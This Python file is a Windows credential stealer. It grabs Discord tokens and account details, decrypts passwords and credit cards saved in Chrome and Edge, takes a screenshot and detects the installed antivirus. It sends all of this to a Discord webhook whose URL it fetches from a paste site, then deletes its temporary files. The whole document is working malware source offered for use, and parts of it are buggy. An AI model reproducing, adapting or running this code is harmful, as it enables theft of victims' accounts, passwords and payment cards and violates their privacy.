from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives.ciphers import (Cipher, algorithms, modes)
from cryptography.hazmat.backends import default_backend
from dhooks import Webhook, File
from PIL import ImageGrab
from sys import argv
from time import sleep
from threading import Thread
from datetime import datetime
from base64 import b64decode
from email import encoders
from shutil import copyfile
import cryptography
import win32api
import win32con
import ctypes.wintypes
import ctypes
from urllib.parse import urlencode
import http.cookiejar as cookiejar
import smtplib
import zipfile
import platform
import win32gui
import pywintypes
import os
if os.name != "nt":
    exit()
import json
import base64
import requests
import win32crypt
import shutil
import sqlite3
import sys
import discord
import time
import platform as plt
from re import findall
from json import loads, dumps
from subprocess import Popen, PIPE
from urllib.request import Request, urlopen
from datetime import timezone, datetime, timedelta
from Crypto.Cipher import AES
import win32com.shell.shell as shell
import os, random, string, time, ctypes, sys, requests, base64, json
from colorama import Fore
from itertools import cycle
from random import randint
from lxml.html import fromstring
import traceback

url = "hastebin or pastebin url raw"
r = requests.get(url)
webhook_url = r.text

languages = {
    'da': 'Danish, Denmark',
    'de': 'German, Germany',
    'en-GB': 'English, United Kingdom',
    'en-US': 'English, United States',
    'es-ES': 'Spanish, Spain',
    'fr': 'French, France',
    'hr': 'Croatian, Croatia',
    'lt': 'Lithuanian, Lithuania',
    'hu': 'Hungarian, Hungary',
    'nl': 'Dutch, Netherlands',
    'no': 'Norwegian, Norway',
    'pl': 'Polish, Poland',
    'pt-BR': 'Portuguese, Brazilian, Brazil',
    'ro': 'Romanian, Romania',
    'fi': 'Finnish, Finland',
    'sv-SE': 'Swedish, Sweden',
    'vi': 'Vietnamese, Vietnam',
    'tr': 'Turkish, Turkey',
    'cs': 'Czech, Czechia, Czech Republic',
    'el': 'Greek, Greece',
    'bg': 'Bulgarian, Bulgaria',
    'ru': 'Russian, Russia',
    'uk': 'Ukranian, Ukraine',
    'th': 'Thai, Thailand',
    'zh-CN': 'Chinese, China',
    'ja': 'Japanese',
    'zh-TW': 'Chinese, Taiwan',
    'ko': 'Korean, Korea'
}

LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")
PATHS = {
    "Discord": ROAMING +
    "\\Discord",
    "Discord Canary": ROAMING +
    "\\discordcanary",
    "Discord PTB": ROAMING +
    "\\discordptb",
    "Lightcord": ROAMING +
    "\\Lightcord",
    "Opera": ROAMING +
    "\\Opera Software\\Opera Stable",
    "Opera GX": ROAMING +
    "\\Opera Software\\Opera GX Stable",
    "Google Chrome": LOCAL +
    "\\Google\\Chrome\\User Data\\Default",
    "Brave": LOCAL +
    "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
    "Yandex": LOCAL +
    "\\Yandex\\YandexBrowser\\User Data\\Default",
    "Vivaldi": LOCAL +
    "\\Vivaldi\\User Data\\Default",
    "MSEdge": LOCAL +
    "\\Microsoft\\Edge\\User Data\\Default",
}


def getheaders(token=None, content_type="application/json"):
    headers = {
        "Content-Type": content_type,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
    }
    if token:
        headers.update({"Authorization": token})
    return headers


def getuserdata(token):
    try:
        return loads(
            urlopen(
                Request(
                    "https://discordapp.com/api/v6/users/@me",
                    headers=getheaders(token))).read().decode())
    except BaseException:
        pass


def gettokens(path):
    path += "\\LOCAL Storage\\leveldb"
    tokens = []
    for file_name in os.listdir(path):
        if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
            continue
        for line in [
            x.strip() for x in open(
                f"{path}\\{file_name}",
                errors="ignore").readlines() if x.strip()]:
            for regex in (
                r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}",
                    r"mfa\.[\w-]{84}"):
                for token in findall(regex, line):
                    tokens.append(token)
    return tokens


def has_payment_methods(token):
    try:
        return bool(
            len(
                loads(
                    urlopen(
                        Request(
                            "https://discordapp.com/api/v6/users/@me/billing/payment-sources",
                            headers=getheaders(token))).read().decode())) > 0)
    except BaseException:
        pass


def main():
    embeds = []
    working = []
    checked = []
    already_cached_tokens = []
    working_ids = []
    computer_os = plt.platform()
    pc_username = os.getenv("UserName")
    pc_name = os.getenv("COMPUTERNAME")
    for platform, path in PATHS.items():
        if not os.path.exists(path):
            continue
        for token in gettokens(path):
            if token in checked:
                continue
            checked.append(token)
            uid = None
            if not token.startswith("mfa."):
                try:
                    uid = b64decode(token.split(".")[0].encode()).decode()
                except BaseException:
                    pass
                if not uid or uid in working_ids:
                    continue
            user_data = getuserdata(token)
            if not user_data:
                continue
            working_ids.append(uid)
            working.append(token)
            username = user_data["username"] + \
                "#" + str(user_data["discriminator"])
            user_id = user_data["id"]
            locale = user_data['locale']
            email = user_data.get("email")
            phone = user_data.get("phone")
            verified = user_data['verified']
            mfa_enabled = user_data['mfa_enabled']
            flags = user_data['flags']

            creation_date = datetime.utcfromtimestamp(
                ((int(user_id) >> 22) + 1420070400000) / 1000).strftime('%d-%m-%Y・%H:%M:%S')

            language = languages.get(locale)
            nitro = bool(user_data.get("premium_type"))
            billing = bool(has_payment_methods(token))
            embed = {"color": 2,
                     "fields": [{"name": "**Account Info**",
                                 "value": f'Email: {email}\nPhone: {phone}\nNitro: {nitro}\nBilling Info: {billing}',
                                 "inline": True},
                                {"name": "**Token**",
                                 "value": f"`{token}`",
                                 "inline": False}],
                     "author": {"name": f"{username}・{user_id}",
                                },
                     "footer": {"text": "test"}}
            embeds.append(embed)

    if len(working) == 0:
        working.append('123')
    webhook_info = {
        "content": "",
        "embeds": embeds,
        "username": "demo",
        "avatar_url": "https://avatarfiles.alphacoders.com/977/thumb-1920-97774.gif"}
    try:
        urlopen(
            Request(
                webhook_url,
                data=dumps(webhook_info).encode(),
                headers=getheaders()))
    except BaseException:
        pass



# DISCORD WEBHOOK:
url = "hastebin or pastebin url raw"
r = requests.get(url)
webhook_url = r.text
hook = Webhook(r.text)
# DISCORD WEBHOOK 2:
hooks = Webhook(r.text)

APP_DATA_PATH = os.environ['LOCALAPPDATA']
DB_PATH = r'Google\Chrome\User Data\Default\Login Data'

NONCE_BYTE_SIZE = 12


def encrypt(cipher, plaintext, nonce):
    cipher.mode = modes.GCM(nonce)
    encryptor = cipher.encryptor()
    ciphertext = encryptor.update(plaintext)
    return (cipher, ciphertext, nonce)


def decrypt(cipher, ciphertext, nonce):
    cipher.mode = modes.GCM(nonce)
    decryptor = cipher.decryptor()
    return decryptor.update(ciphertext)


def get_cipher(key):
    cipher = Cipher(
        algorithms.AES(key),
        None,
        backend=default_backend()
    )
    return cipher


def decryptionDPAPI(encrypted):
    import ctypes
    import ctypes.wintypes

    class DATA_BLOB(ctypes.Structure):
        _fields_ = [('cbData', ctypes.wintypes.DWORD),
                    ('pbData', ctypes.POINTER(ctypes.c_char))]

    p = ctypes.create_string_buffer(encrypted, len(encrypted))
    blobin = DATA_BLOB(ctypes.sizeof(p), p)
    blobout = DATA_BLOB()
    retval = ctypes.windll.crypt32.CryptUnprotectData(
        ctypes.byref(blobin), None, None, None, None, 0, ctypes.byref(blobout))
    if not retval:
        raise ctypes.WinError()
    result = ctypes.string_at(blobout.pbData, blobout.cbData)
    ctypes.windll.kernel32.LocalFree(blobout.pbData)
    return result


def unix_decrypt(encrypted):
    if sys.platform.startswith('linux'):
        password = 'peanuts'
        iterations = 1
    else:
        raise NotImplementedError

    from Crypto.Cipher import AES
    from Crypto.Protocol.KDF import PBKDF2

    salt = 'saltysalt'
    iv = ' ' * 16
    length = 16
    key = PBKDF2(password, salt, length, iterations)
    cipher = AES.new(key, AES.MODE_CBC, IV=iv)
    decrypted = cipher.decrypt(encrypted[3:])
    return decrypted[:-ord(decrypted[-1])]


def localdata_key():
    jsn = None
    with open(os.path.join(os.environ['LOCALAPPDATA'], r"Google\Chrome\User Data\Local State"), encoding='utf-8', mode="r") as f:
        jsn = json.loads(str(f.readline()))
    return jsn["os_crypt"]["encrypted_key"]


def aes_decrypt(encrypted_txt):
    encoded_key = localdata_key()
    encrypted_key = base64.b64decode(encoded_key.encode())
    encrypted_key = encrypted_key[5:]
    key = decryptionDPAPI(encrypted_key)
    nonce = encrypted_txt[3:15]
    cipher = get_cipher(key)
    return decrypt(cipher, encrypted_txt[15:], nonce)


class ChromePassword:
    def __init__(self):
        self.passwordList = []

    def get_chrome_db(self):
        _full_path = os.path.join(APP_DATA_PATH, DB_PATH)
        _temp_path = os.path.join(APP_DATA_PATH, 'sqlite_file')
        if os.path.exists(_temp_path):
            os.remove(_temp_path)
        shutil.copyfile(_full_path, _temp_path)
        self.show_password(_temp_path)

    def show_password(self, db_file):
        conn = sqlite3.connect(db_file)
        _sql = 'select signon_realm,username_value,password_value from logins'
        for row in conn.execute(_sql):
            host = row[0]
            if host.startswith('android'):
                continue
            name = row[1]
            value = self.chrome_decrypt(row[2])
            _info = 'HOSTNAME: %s\nUSER: %s\nPASSWORD: %s\n\n' % (
                host, name, value)
            self.passwordList.append(_info)
        conn.close()
        os.remove(db_file)

    def chrome_decrypt(self, encrypted_txt):
        if sys.platform == 'win32':
            try:
                if encrypted_txt[:4] == b'\x01\x00\x00\x00':
                    decrypted_txt = decryptionDPAPI(encrypted_txt)
                    return decrypted_txt.decode()
                elif encrypted_txt[:3] == b'v10':
                    decrypted_txt = aes_decrypt(encrypted_txt)
                    return decrypted_txt[:-16].decode()
            except WindowsError:
                return None
        else:
            try:
                return unix_decrypt(encrypted_txt)
            except NotImplementedError:
                return None

    def save_passwords(self):
        with open('C:\\ProgramData\\Passwords.txt', 'w', encoding='utf-8') as f:
            f.writelines(self.passwordList)


if __name__ == "__main__":
    Main = ChromePassword()
    Main.get_chrome_db()
    Main.save_passwords()

if os.path.exists('C:\\Program Files\\Windows Defender'):
    av = 'Windows Defender'
if os.path.exists('C:\\Program Files\\AVAST Software\\Avast'):
    av = 'Avast'
if os.path.exists('C:\\Program Files\\AVG\\Antivirus'):
    av = 'AVG'
if os.path.exists('C:\\Program Files\\Avira\\Launcher'):
    av = 'Avira'
if os.path.exists('C:\\Program Files\\IObit\\Advanced SystemCare'):
    av = 'Advanced SystemCare'
if os.path.exists('C:\\Program Files\\Bitdefender Antivirus Free'):
    av = 'Bitdefender'
if os.path.exists('C:\\Program Files\\COMODO\\COMODO Internet Security'):
    av = 'Comodo'
if os.path.exists('C:\\Program Files\\DrWeb'):
    av = 'Dr.Web'
if os.path.exists('C:\\Program Files\\ESET\\ESET Security'):
    av = 'ESET'
if os.path.exists('C:\\Program Files\\GRIZZLY Antivirus'):
    av = 'Grizzly Pro'
if os.path.exists('C:\\Program Files\\Kaspersky Lab'):
    av = 'Kaspersky'
if os.path.exists('C:\\Program Files\\IObit\\IObit Malware Fighter'):
    av = 'Malware fighter'
if os.path.exists('C:\\Program Files\\360\\Total Security'):
    av = '360 Total Security'
else:
    pass

# SCREENSHOT:
screen = ImageGrab.grab()
screen.save(os.getenv('ProgramData') + '\\Screenshot.jpg')
screen = open('C:\\ProgramData\\Screenshot.jpg', 'rb')
screen.close()
screenshot = File('C:\\ProgramData\\Screenshot.jpg')

# PASSWORDS:
zname = r'C:\\ProgramData\\Passwords.zip'
newzip = zipfile.ZipFile(zname, 'w')
newzip.write(r'C:\\ProgramData\\Passwords.txt')
newzip.write(r'C:\\ProgramData\\Screenshot.jpg')
newzip.close()
passwords = File('C:\\ProgramData\\Passwords.zip')


# SEND THOSE VARIABLES:
hook.send("screenshot:", file=screenshot)
hook.send("passwords:", file=passwords)
os.remove('C:\\ProgramData\\Passwords.txt')
os.remove('C:\\ProgramData\\Screenshot.jpg')
os.remove('C:\\ProgramData\\Passwords.zip')

# CHROME GRAB: (2) | SENDS CREDIT CARD INFORMATION


def get_master_key():
    try:
        with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State',
                  "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
    except:
        pass
        exit()
    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]
    master_key = ctypes.windll.crypt32.CryptUnprotectData(
        (master_key, None, None, None, 0)[1])
    return master_key


def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)


def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)


def decrypt_password(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = generate_cipher(master_key, iv)
        decrypted_pass = decrypt_payload(cipher, payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass
    except Exception as e:
        pass


def get_password():
    master_key = get_master_key()
    login_db = os.environ['USERPROFILE'] + os.sep + \
        r'AppData\Local\Google\Chrome\User Data\default\Login Data'
    try:
        shutil.copy2(login_db,
                     "Loginvault.db")
    except:
        pass

    try:
        cursor.execute(
            "SELECT action_url, username_value, password_value FROM logins")
        for r in cursor.fetchall():
            url = r[0]
            username = r[1]
            encrypted_password = r[2]
            decrypted_password = decrypt_password(
                encrypted_password, master_key)
            if username != "" or decrypted_password != "":
                hook.send(f"URL: " + url + "\nUSER: " + username +
                          "\nPASSWORD: " + decrypted_password + "\n" + "*" * 10 + "\n")
    except Exception as e:
        pass

    cursor.close()
    conn.close()
    try:
        os.remove("Loginvault.db")
    except Exception as e:
        pass


def get_credit_cards():
    master_key = get_master_key()
    login_db = os.environ['USERPROFILE'] + os.sep + \
        r'AppData\Local\Google\Chrome\User Data\default\Web Data'
    shutil.copy2(login_db,
                 "CCvault.db")
    conn = sqlite3.connect("CCvault.db")
    cursor = conn.cursor()

    try:
        cursor.execute("SELECT * FROM credit_cards")
        for r in cursor.fetchall():
            username = r[1]
            encrypted_password = r[4]
            decrypted_password = decrypt_password(
                encrypted_password, master_key)
            expire_mon = r[2]
            expire_year = r[3]
            hook.send(f"CARD-NAME: " + username + "\nNUMBER: " + decrypted_password + "\nEXPIRY M: " +
                      str(expire_mon) + "\nEXPIRY Y: " + str(expire_year) + "\n" + "*" * 10 + "\n")

    except Exception as e:
        pass

    cursor.close()
    conn.close()
    try:
        os.remove("CCvault.db")
    except Exception as e:
        pass


# MICROSOFT EDGE GRAB | SENDS CREDIT CARD INFORMATION & PASSWORDS

def get_password1():
    master_key = get_master_key()
    login_db = os.environ['USERPROFILE'] + os.sep + \
        r'AppData\Local\Microsoft\Edge\User Data\Profile 1\Login Data'
    try:
        shutil.copy2(login_db,
                     "Loginvault.db")
    except:
      pass

    try:
        cursor.execute(
            "SELECT action_url, username_value, password_value FROM logins")
        for r in cursor.fetchall():
            url = r[0]
            username = r[1]
            encrypted_password = r[2]
            decrypted_password = decrypt_password(
                encrypted_password, master_key)
            if username != "" or decrypted_password != "":
                hooks.send(f"URL: " + url + "\nUSER: " + username +
                           "\nPASSWORD: " + decrypted_password + "\n" + "*" * 10 + "\n")
    except Exception as e:
        pass

    cursor.close()
    conn.close()
    try:
        os.remove("Loginvault.db")
    except Exception as e:
        pass


def get_credit_cards1():
    master_key = get_master_key()
    login_db = os.environ['USERPROFILE'] + os.sep + \
        r'AppData\Local\Microsoft\Edge\User Data\Profile 1\Login Data'
    try:
        shutil.copy2(login_db, "CCvault.db")
    except:
        pass

    try:
        cursor.execute("SELECT * FROM credit_cards")
        for r in cursor.fetchall():
            username = r[1]
            encrypted_password = r[4]
            decrypted_password = decrypt_password(
                encrypted_password, master_key)
            expire_mon = r[2]
            expire_year = r[3]
            hooks.send(f"CARD-NAME: " + username + "\nNUMBER: " + decrypted_password + "\nEXPIRY M: " +
                       str(expire_mon) + "\nEXPIRY Y: " + str(expire_year) + "\n" + "*" * 10 + "\n")

    except Exception as e:
        pass

    cursor.close()
    conn.close()
    try:
        os.remove("CCvault.db")
    except Exception as e:
        pass


try:
        os.remove(filename)
except BaseException:
        pass
def slowprint(s, c, newLine = True):
	for c in s + '\n':
		sys.stdout.write(c); sys.stdout.flush(); time.sleep(1./30)



if __name__ == "__main__":
    main()
